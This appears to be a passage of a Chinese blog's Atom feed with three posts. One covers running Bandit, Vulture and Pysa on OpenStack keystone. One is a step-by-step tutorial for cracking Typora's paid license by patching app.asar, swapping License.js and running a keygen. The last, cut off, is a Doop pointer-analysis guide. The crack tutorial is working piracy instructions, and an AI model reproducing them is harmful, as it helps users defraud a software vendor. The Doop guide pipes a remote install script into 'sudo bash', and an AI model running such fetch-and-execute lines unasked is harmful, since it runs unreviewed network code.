源码</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/openstack/keystone.git --single-branch --branch stable/victoria</span><br></pre></td></tr></table></figure><p>主要的功能就是黑名单和自定义检测规则。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 运行 Bandit</span></span><br><span class="line">bandit -r keystone -o test.txt -f txt</span><br><span class="line">bandit -r keystone -o test.html -f html</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制到本地查看</span></span><br><span class="line">scp -r jck@10.123.123.123:~/bandit-test/test.html /c/Users/linki/Desktop</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置文件</span></span><br><span class="line">.bandit</span><br></pre></td></tr></table></figure><p>导出的文件 <a href="https://raw.githubusercontent.com/jckling/Assets/master/python/test.html">test.html</a> 显示扫描了 118379 行代码，蓝色表示低危，橙色表示中危，这里所有的都只出现在 tests 的测试文件中。</p><p>过滤测试文件夹，重新执行检测，得到 html 文件：<a href="https://raw.githubusercontent.com/jckling/Assets/master/python/testx.html">testx.html</a> 显示扫描 41415 行代码，没有用到危险函数。</p><p>Bandit 原先是 OpenStack 的项目，部分组件的开发有使用 Bandit 进行检查，其中就包括 keystone ，因此用 Bandit 扫描组件的意义可能不是很大。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 过滤测试文件夹</span></span><br><span class="line">bandit -r keystone/keystone/ --exclude keystone/keystone/tests/ -o testx.html -f html</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制到本地查看</span></span><br><span class="line">scp -r jck@10.123.123.123:~/bandit-test/testx.html /c/Users/linki/Desktop</span><br></pre></td></tr></table></figure><h2 id="Vulture"><a href="#Vulture" class="headerlink" title="Vulture"></a>Vulture</h2><p>同样利用了 ast 模块生成抽象语法树，在遍历时记录已定义和使用的对象名称，最后报告未使用的对象（死代码）。还通过查找 return、break、continue、raise、不满足条件的 if 条件、while 条件来检测不可达的代码。因为只考虑对象名称，没有考虑作用域，因此可能存在漏报，而且隐式调用可能会被误报。</p><h3 id="测试-keystone-1"><a href="#测试-keystone-1" class="headerlink" title="测试 keystone"></a>测试 keystone</h3><p>具体的安装与测试操作如下，执行结果导出为 <a href="https://raw.githubusercontent.com/jckling/Assets/master/python/unused.txt">unused.txt</a>，最后给出了置信度。执行速度非常快，但给出的结果信息量少，只能作为简单的参考。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建文件夹</span></span><br><span class="line"><span class="built_in">mkdir</span> vulture-test</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置虚拟环境</span></span><br><span class="line">python -m venv vulture-test</span><br><span class="line"></span><br><span class="line"><span class="comment"># 激活虚拟环境</span></span><br><span class="line"><span class="built_in">cd</span> vulture-test</span><br><span class="line"><span class="built_in">source</span> bin/activate</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装 Vulture</span></span><br><span class="line">pip install vulture</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载 keystone 源码</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/openstack/keystone.git --single-branch --branch stable/victoria</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行分析</span></span><br><span class="line">vulture keystone/keystone/ --exclude keystone/keystone/tests/ --sort-by-size &gt; unused.txt</span><br></pre></td></tr></table></figure><h2 id="Pysa"><a href="#Pysa" class="headerlink" title="Pysa"></a>Pysa</h2><p>入门教程可以看：<a href="https://jckling.github.io/2021/07/07/Security/Pysa%20Tutorial/">Pyre 污点分析工具 Pysa 使用教程</a></p><h3 id="测试-keystone-2"><a href="#测试-keystone-2" class="headerlink" title="测试 keystone"></a>测试 keystone</h3><h4 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h4><p>安装依赖</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 更新 Python3.8.x</span></span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt install python3.8 python3.8-venv python3.8-dev python3-pip -y</span><br><span class="line"></span><br><span class="line"><span class="comment"># update-alternatives 配置 python 指向 python3.8.x 后</span></span><br><span class="line">python -m pip install --upgrade setuptools</span><br><span class="line">pip install wheel</span><br></pre></td></tr></table></figure><p>初始配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建虚拟环境</span></span><br><span class="line">python -m venv ~/.venvs/pysa</span><br><span class="line"></span><br><span class="line"><span class="comment"># 激活虚拟环境</span></span><br><span class="line"><span class="built_in">source</span> ~/.venvs/pysa/bin/activate</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新工具</span></span><br><span class="line">pip install wheel</span><br><span class="line">python -m pip install --upgrade setuptools</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装 Pyre 和 SAPP</span></span><br><span class="line">pip install pyre-check fb-sapp</span><br></pre></td></tr></table></figure><h4 id="分析-keystone-源码"><a href="#分析-keystone-源码" class="headerlink" title="分析 keystone 源码"></a>分析 keystone 源码</h4><p>下载 Victoria 版本的 keystone 源码并安装依赖，能够让 Pysa 使用和导入模块对应的污点模型，检测导入模块内部的污点源和汇。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建测试目录</span></span><br><span class="line"><span class="built_in">mkdir</span> pysa-test &amp;&amp; <span class="built_in">cd</span> pysa-test</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载源码</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/openstack/keystone.git --single-branch --branch stable/victoria</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入源码目录</span></span><br><span class="line"><span class="built_in">cd</span> keystone</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装 keystone 依赖</span></span><br><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure><p>初始化配置，添加类型注释（Python 3.5+）部分会失败，导入过滤器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 初始化配置</span></span><br><span class="line">pyre init</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编辑配置文件</span></span><br><span class="line">vim .pyre_configuration</span><br><span class="line"></span><br><span class="line"><span class="comment"># 为源码添加类型注释</span></span><br><span class="line">pyre infer -r -i</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入过滤器设置 SAPP</span></span><br><span class="line">sapp filter import ~/.venvs/pysa/lib/pyre_check/pysa_filters</span><br></pre></td></tr></table></figure><p>过滤器 <a href="https://github.com/facebook/pyre-check/tree/master/tools/sapp/pysa_filters">pysa_filters</a> 包含以下配置文件</p><ul><li>5001-code-command-injection.json</li><li>5005-sql-injection.json</li><li>5011-userdata-to-filesystem.json</li><li>6065-argument-injection.json</li><li>6066-unsafe-deserialization.json</li><li>6073-server-side-template-injection.json</li></ul><p>以 5001-code-command-injection.json 为例，设置不展示元数据（feature）以及显示的追踪长度</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Command and Code Injection&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;High signal filter for 5001 Shell Injection&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;features&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;mode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;none of&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;features&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;always-type:scalar&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;always-type:bool&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;via:shell_escape&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;always-via:shell_escape&quot;</span></span><br><span class="line">            <span class="punctuation">]</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;codes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="number">5001</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;traceLengthFromSources&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">        <span class="number">3</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;traceLengthToSinks&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">        <span class="number">4</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>运行 Pyre 并将结果存储在 pysa-runs 文件夹，使用 SAPP 可视化展示</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 运行 Pysa</span></span><br><span class="line">pyre analyze --no-verify --save-results-to ./pysa-runs --dump-call-graph</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入文件 运行 SAPP</span></span><br><span class="line">sapp analyze ./pysa-runs/taint-output.json</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行服务器</span></span><br><span class="line">sapp server</span><br></pre></td></tr></table></figure><p>由于运行 OpenStack 服务的主机上 keystone 绑定了 5000 端口，而 SAPP 不提供修改端口的选项，所以重新弄了台主机专门用于分析。另外，SAPP 的 UI 默认绑定在 localhost 上，需要在本地使用 iptables 配置转发。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启用本地转发</span></span><br><span class="line">sudo sysctl -w net.ipv4.conf.ens160.route_localnet=1</span><br><span class="line"></span><br><span class="line"><span class="comment"># iptables 配置规则</span></span><br><span class="line">sudo iptables -t nat -I PREROUTING -p tcp -d 10.112.148.73/24 --dport 2222 -j DNAT --to-destination 127.0.0.1:5000</span><br></pre></td></tr></table></figure><p>通过 Web UI 查看结果，一共找出 13 个问题，全是可能的 XSS 漏洞：</p><img src="https://s2.loli.net/2021/12/30/rliNpZJgWLwbex4.png" style="zoom: 67%;" /><p>导入的过滤器可以在 Filter 中使用，不过 keystone 中没有检测出这些问题</p><img src="https://s2.loli.net/2021/12/30/5lWxd3sk7IKHnbM.png" style="zoom: 67%;" /><p>点开一个问题的 Traces 展示：</p><ul><li><code> UserControlled</code> 类型的污点数据一直传播到 keystone.api.os_oauth1.RequestTokenResource.post 函数<ul><li>最短的传播距离</li></ul></li><li>源点和汇点的追踪在 keystone.api.os_oauth1.RequestTokenResource.post 交汇</li><li><code> UserControlled</code> 类型的污点数据从 keystone.api.os_oauth1.RequestTokenResource.post 开始，传播到 XSS 类型的汇点<ul><li>和交汇相同</li></ul></li></ul><p>使用 <code>pyre query</code> 导出数据：<a href="https://raw.githubusercontent.com/jckling/Assets/master/python/graph.json">graph.json</a>、<a href="https://raw.githubusercontent.com/jckling/Assets/master/python/hierarchy.json">hierarchy.json</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动服务器</span></span><br><span class="line">pyre start</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导出调用图</span></span><br><span class="line">pyre query <span class="string">&quot;dump_call_graph()&quot;</span> | python -m json.tool &gt; graph.json</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导出类层次结构（省略变量类型）</span></span><br><span class="line">pyre query <span class="string">&quot;dump_class_hierarchy()&quot;</span> | python -m json.tool &gt; hierarchy.json</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭服务器</span></span><br><span class="line">pyre stop</span><br></pre></td></tr></table></figure><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>差不多快半年前的东西了，而且目前也没有在做 Python 的静态程序分析。既然当时都调研和试用过了，那就稍微理一下存档这份流水账.jpg</p>]]></content>
    
    
    <summary type="html">一些开源和闭源工具</summary>
    
    
    
    <category term="Security" scheme="https://jckling.github.io/categories/Security/"/>
    
    
    <category term="Python" scheme="https://jckling.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Typora 激活教程</title>
    <link href="https://jckling.github.io/2021/12/24/Other/Typora%20%E6%BF%80%E6%B4%BB%E6%95%99%E7%A8%8B/"/>
    <id>https://jckling.github.io/2021/12/24/Other/Typora%20%E6%BF%80%E6%B4%BB%E6%95%99%E7%A8%8B/</id>
    <published>2021-12-24T09:52:12.000Z</published>
    <updated>2023-01-11T15:27:44.000Z</updated>
    
    <content type="html"><![CDATA[<div class="note info flat"><p>请支持正版软件</p></div><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前用 Typora 的时候崩溃过两次（导致内容全无），<code>Ctrl + Z</code> 也无法撤销恢复，然后就不怎么敢用了。后来也试了试其他支持 markdown 的编辑器，但确实 Typora 的颜值最能打。</p><p>原来 2021.11 就推出了正式版 Typora 1.0，现在都 1.4.8 了，目前是 ￥89 付费买断，支持激活三台设备。未激活的情况下每次打开都会弹窗：</p><img src="https://s2.loli.net/2021/12/24/8KyBpSdFsDVHtWh.jpg" style="zoom:80%;" /><p>不过选择 <code>不是现在</code> 之后也可以好好用（？）左下角多一个 <code>未激活</code>：</p><img src="https://s2.loli.net/2021/12/24/3iOwfDNMuB6Jb5n.jpg" style="zoom:80%;" /><h2 id="1-4-8-版本"><a href="#1-4-8-版本" class="headerlink" title="1.4.8 版本"></a>1.4.8 版本</h2><p>下载 <a href="https://github.com/Delppine1024/TGreen/releases">app_asar_file_v1.4.8-windows-x64.zip</a>，替换 Typora 安装路径下的 app.asar。</p><img src="https://s2.loli.net/2022/12/17/vlHLud6BNKXi7k8.png" style="zoom:50%;" /><h2 id="1-2-4-版本"><a href="#1-2-4-版本" class="headerlink" title="1.2.4 版本"></a>1.2.4 版本</h2><p>下载 <a href="https://github.com/SnapdragonLee/TyporaCrack/releases">app_asar_file_v1.2.4-windows-x64.zip</a>，替换 Typora 安装路径下的 app.asar。</p><img src="https://s2.loli.net/2022/03/30/abysPMEHNrCQ2ZX.png" style="zoom:50%;" /><h2 id="1-1-5-版本"><a href="#1-1-5-版本" class="headerlink" title="1.1.5 版本"></a>1.1.5 版本</h2><p>原来的代码不能直接用于新版本，需要根据 <code>C:\Users\&#123;用户名&#125;\AppData\Roaming\Typora\typora.log</code> 修改代码。</p><p>当然，为了方便，直接下载 <a href="https://github.com/SnapdragonLee/TyporaCrack/releases">app_asar_v1.1.5.zip</a> 替换 Typora 安装路径下的 app.asar 文件就可以了。例如，我需要替换的文件为 <code>D:\Program Files\Typora\resources\app.asar</code>。</p><img src="https://s2.loli.net/2022/03/08/e6J9GbESQsa1BVY.png" style="zoom:50%;" /><p>替换完毕后打开 Typora，已经激活。</p><img src="https://s2.loli.net/2022/03/08/Q4funqhdGMYpUWA.png" style="zoom:50%;" /><h2 id="1-0-3-及之前版本"><a href="#1-0-3-及之前版本" class="headerlink" title="1.0.3 及之前版本"></a>1.0.3 及之前版本</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>使用 Windows 系统，安装以下软件：</p><ul><li><a href="https://www.python.org/downloads/">Python3</a> + <a href="https://virtualenv.pypa.io/en/latest/installation.html">virtualenv</a></li><li><a href="https://git-scm.com/downloads">Git</a></li><li><a href="https://nodejs.org/zh-cn/download/">Node.js</a></li></ul><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><ol><li><p>创建虚拟环境</p><p> 在桌面右键打开 Git Bash</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建文件夹</span></span><br><span class="line"><span class="built_in">mkdir</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置 python 虚拟环境</span></span><br><span class="line">virtualenv tmp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入目标文件夹</span></span><br><span class="line"><span class="built_in">cd</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 激活虚拟环境</span></span><br><span class="line"><span class="built_in">source</span> ./Scripts/activate</span><br></pre></td></tr></table></figure></li><li><p>克隆代码仓库 <a href="https://github.com/Mas0nShi/typoraCracker">Mas0nShi&#x2F;typoraCracker</a></p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/Mas0nShi/typoraCracker.git</span><br></pre></td></tr></table></figure></li><li><p>安装依赖</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入文件夹</span></span><br><span class="line"><span class="built_in">cd</span> typoraCracker</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装依赖</span></span><br><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure></li><li><p>生成破解文件</p><p> 注意将 <code>D:\Program Files\Typora\resources\app.asar</code> 替换为自己的 Typora 安装目录，执行完毕后会生成 <code>dec_app</code> 文件夹</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python typora.py <span class="string">&quot;D:\Program Files\Typora\resources\app.asar&quot;</span> .</span><br></pre></td></tr></table></figure></li><li><p>拷贝仓库中的 License.js 许可证</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> ./example/patch/License.js ./dec_app/</span><br></pre></td></tr></table></figure></li><li><p>重新生成 <code>app.asar</code></p><p> 执行完毕后会生成 <code>app.asar</code> 文件</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python typora.py -u ./dec_app/ .</span><br></pre></td></tr></table></figure></li><li><p>替换 <code>app.asar</code></p><p> 如果命令提示权限不足，可以人工进行移动</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 备份</span></span><br><span class="line"><span class="built_in">mv</span> <span class="string">&quot;D:\Program Files\Typora\resources\app.asar&quot;</span> <span class="string">&quot;D:\Program Files\Typora\resources\app.asar.bak&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 替换</span></span><br><span class="line"><span class="built_in">mv</span> ./app.asar <span class="string">&quot;D:\Program Files\Typora\resources\app.asar&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>生成序列号</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node ./example/keygen.js</span><br></pre></td></tr></table></figure></li><li><p>激活 Typora</p> <img src="https://s2.loli.net/2021/12/24/gbiVjK892UMGLEv.jpg" style="zoom:70%;" /></li></ol><h2 id="参阅"><a href="#参阅" class="headerlink" title="参阅"></a>参阅</h2><ul><li><a href="https://github.com/Mas0nShi/typoraCracker">Mas0nShi&#x2F;typoraCracker</a></li><li><a href="https://github.com/SnapdragonLee/TyporaCrack">SnapdragonLee&#x2F;TyporaCrack</a></li><li><a href="https://github.com/Delppine1024/TGreen">Delppine1024&#x2F;TGreen</a></li></ul>]]></content>
    
    
    <summary type="html">支持正式版（~1.4.x）和开发版（~1.5.x）</summary>
    
    
    
    <category term="Other" scheme="https://jckling.github.io/categories/Other/"/>
    
    
    <category term="Windows" scheme="https://jckling.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>指针分析工具 Doop 使用指南</title>
    <link href="https://jckling.github.io/2021/12/17/Security/%E6%8C%87%E9%92%88%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%20Doop%20%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/"/>
    <id>https://jckling.github.io/2021/12/17/Security/%E6%8C%87%E9%92%88%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%20Doop%20%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</id>
    <published>2021-12-17T03:41:30.000Z</published>
    <updated>2022-11-13T04:02:02.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一边学习 Datalog&#x2F;Doop 一边复现论文，看了些论文补充知识，做了些实验验证理解。中文资料少就算了，英文资料也没有非常系统的，于是经常在频道里提问🤣。在这上面花了大约一整个月的时间，然后还没有复现出来… 被抓去学 Soot 做分析，但是确认了想法之后发现用 Soot 还得实现过程内数据流分析，而这只是分析的第一步，涉及到过程间的数据流那不还得再实现一遍过程间分析？</p><p>不知道之后怎么安排，反正既然都用了这么久，就把理解的内容梳理一下，自己用的时候也方便检索。</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>使用 Doop 前需要安装 Datalog 引擎，由于默认的 souffle 不支持 Windows，因此建议在 Linux 环境下使用。</p><p>Doop 支持两个引擎：商业的 <a href="http://www.logicblox.com/">LogicBlox</a> 和开源的 <a href="https://github.com/souffle-lang/souffle">souffle</a>，默认使用 souffle。</p><ul><li>LogicBlox v3 平替：<a href="http://snf-705535.vm.okeanos.grnet.gr/agreement.html">PA-Datalog</a></li></ul><p>之前已经梳理过两个引擎的使用，不了解的可以先看一下基本语法：</p><ul><li><a href="https://jckling.github.io/2021/10/26/Other/LogiQL%20%E5%85%A5%E9%97%A8/">LogiQL 入门</a></li><li><a href="https://jckling.github.io/2021/11/22/Other/Datalog%20%E5%BC%95%E6%93%8E%20Souffl%C3%A9%20%E6%8C%87%E5%8D%97/">Datalog 引擎 Soufflé 指南</a></li></ul><p>Doop 从 LogicBlox 迁移到 souffle 的原因：<a href="https://yanniss.github.io/doop2souffle-soap17.pdf">Porting Doop to Souffle: A Tale of Inter-Engine Portability for Datalog-Based Analyses</a>，也有文章提过 souffle 的执行速度更快。</p><p><strong>1. 安装 souffle 引擎</strong></p><p>目前支持 1.5.1、2.0.2、2.1（下面的安装指令可能会直接安装最新版的）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -s https://packagecloud.io/install/repositories/souffle-lang/souffle/script.deb.sh | sudo bash</span><br><span class="line">sudo apt-get install souffle</span><br></pre></td></tr></table></figure><p>可能会出现错误，这个得等 souffle 那边修复xd</p><p><img src="https://s2.loli.net/2021/12/17/Zm9NLfAIdBTiQUh.png"></p><p><strong>2. 安装 doop</strong></p><p>拉取仓库就可以了，注意需要安装 java8</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装 java8</span></span><br><span class="line">sudo apt install java-8-openjdk</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载仓库</span></span><br><span class="line">git <span class="built_in">clone</span> https://bitbucket.org/yanniss/doop.git</span><br></pre></td></tr></table></figure><h1 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h1><h2 id="基本说明"><a href="#基本说明" class="headerlink" title="基本说明"></a>基本说明</h2><p>进入 doop 源码目录下使用，<code>./doop --help all</code> 查看所有帮助信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> doop</span><br><span class="line">./doop --<span class="built_in">help</span> all</span><br></pre></td></tr></table></figure><p>首先 <code>-a,--analysis &lt;NAME&gt;</code> 用于指定分析，通常情况下，敏感度上去了分析耗时也就上去了，因此我个人一般只用 <code>context-insensitive</code> 上下文不敏感分析。有关使用 Datalog 进行指针分析可以看 <a href="http://yanniss.github.io/points-to-tutorial15.pdf">Pointer Analysis</a>。</p><p>注：<code>LB analyses</code> 之后的是适用于 LogicBlox 的分析选项。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-a,--analysis &lt;NAME&gt;                                      The name of the analysis. Valid values: 1-call-site-sensitive, 1-call-site-sensitive+heap, 1-object-1-type-sensitive+heap, 1-object-sensitive,</span><br><span class="line">                                                          1-object-sensitive+heap, 1-type-sensitive, 1-type-sensitive+heap, 2-call-site-sensitive+2-heap, 2-call-site-sensitive+heap, 2-object-sensitive+2-heap,</span><br><span class="line">                                                          2-object-sensitive+heap, 2-type-object-sensitive+2-heap, 2-type-object-sensitive+heap, 2-type-sensitive+heap, 3-object-sensitive+3-heap,</span><br><span class="line">                                                          3-type-sensitive+2-heap, 3-type-sensitive+3-heap, adaptive-2-object-sensitive+heap, basic-only, context-insensitive, context-insensitive-plus,</span><br><span class="line">                                                          context-insensitive-plusplus, data-flow, dependency-analysis, fully-guided-context-sensitive, micro, partitioned-2-object-sensitive+heap,</span><br><span class="line">                                                          selective-2-object-sensitive+heap, sound-may-point-to, sticky-2-object-sensitive, types-only, xtractor, ----- (LB analyses) -----,</span><br><span class="line">                                                          2-object-sensitive+heap-plus, adaptive-insens-2objH, adaptive2-insens-2objH, must-point-to, naive, paddle-2-object-sensitive, paddle-2-object-sensitive+heap,</span><br><span class="line">                                                          partial-insens-s2objH, refA-2-call-site-sensitive+heap, refA-2-object-sensitive+heap, refA-2-type-sensitive+heap, refB-2-call-site-sensitive+heap,</span><br><span class="line">                                                          refB-2-object-sensitive+heap, refB-2-type-sensitive+heap, scc-2-object-sensitive+heap, selective-2-type-sensitive+heap, selective_A-1-object-sensitive,</span><br><span class="line">                                                          selective_B-1-object-sensitive, special-2-object-sensitive+heap, stutter-2-object-sensitive+heap, uniform-1-object-sensitive,</span><br><span class="line">                                                          uniform-2-object-sensitive+heap, 